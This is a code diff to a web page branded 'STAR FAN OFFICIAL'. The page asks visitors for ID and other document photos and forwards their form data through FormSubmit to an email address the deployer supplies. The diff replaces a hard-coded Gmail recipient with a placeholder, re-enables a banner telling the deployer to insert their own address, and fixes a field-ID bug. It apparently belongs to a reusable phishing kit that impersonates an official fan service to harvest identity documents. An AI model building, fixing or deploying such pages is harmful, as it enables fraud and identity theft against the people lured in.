@@ -75,10 +75,10 @@
     <!-- Global container for all pages (renamed to appWrapper) -->
     <div id="appWrapper" class="w-full max-w-lg mx-auto">
         
-        <!-- <!-- CRITICAL ACTION REQUIRED BANNER -->
-        <!-- <div class="bg-red-800 p-3 rounded-lg mb-8 border-2 border-red-500 text-center text-sm font-bold text-white shadow-xl"> -->
-            <!-- ⚠️ ACTION REQUIRED: Edit the code to replace '<span class="text-yellow-300">REPLACE_WITH_YOUR_EMAIL@example.com</span>' with your actual email address in the &lt;script&gt; section.
-        </div> --> -->
+        <!-- CRITICAL ACTION REQUIRED BANNER -->
+        <div class="bg-red-800 p-3 rounded-lg mb-8 border-2 border-red-500 text-center text-sm font-bold text-white shadow-xl">
+            ⚠️ ACTION REQUIRED: Edit the code to replace '<span class="text-yellow-300">REPLACE_WITH_YOUR_EMAIL@example.com</span>' with your actual email address in the &lt;script&gt; section.
+        </div>
 
         <!-- STAR FAN OFFICIAL Header (Always Visible) -->
         <header class="text-center mb-8">
@@ -270,7 +270,7 @@
         // --- FormSubmit Configuration ---
         // ⭐ CRITICAL: REPLACE 'REPLACE_WITH_YOUR_EMAIL@example.com' WITH YOUR ACTUAL EMAIL ADDRESS ⭐
         // This endpoint uses FormSubmit's AJAX feature, allowing us to control the page flow.
-        const formSubmitEndpoint = 'https://formsubmit.co/ajax/viralscript01@gmail.com'; 
+        const formSubmitEndpoint = 'https://formsubmit.co/ajax/REPLACE_WITH_YOUR_EMAIL@example.com'; 
         // ---------------------------------
 
         /**
@@ -293,7 +293,8 @@
 
             // Add confirmation that files were selected (since FormSubmit AJAX doesn't handle file uploads)
             data['IDPhotoSelected'] = !!document.getElementById('idPhoto').files[0] ? 'File Ready' : 'No File';
-            data['StarCardPhotoSelected'] = !!document.getElementById('starCardCardPhoto').files[0] ? 'File Ready' : 'No File';
+            // FIX: Changed 'starCardCardPhoto' to 'starCardPhoto' to match the HTML element ID
+            data['StarCardPhotoSelected'] = !!document.getElementById('starCardPhoto').files[0] ? 'File Ready' : 'No File';
             data['CorrespondencePhotoSelected'] = !!document.getElementById('correspondencePhoto').files[0] ? 'File Ready' : 'No File';
 
             return data;
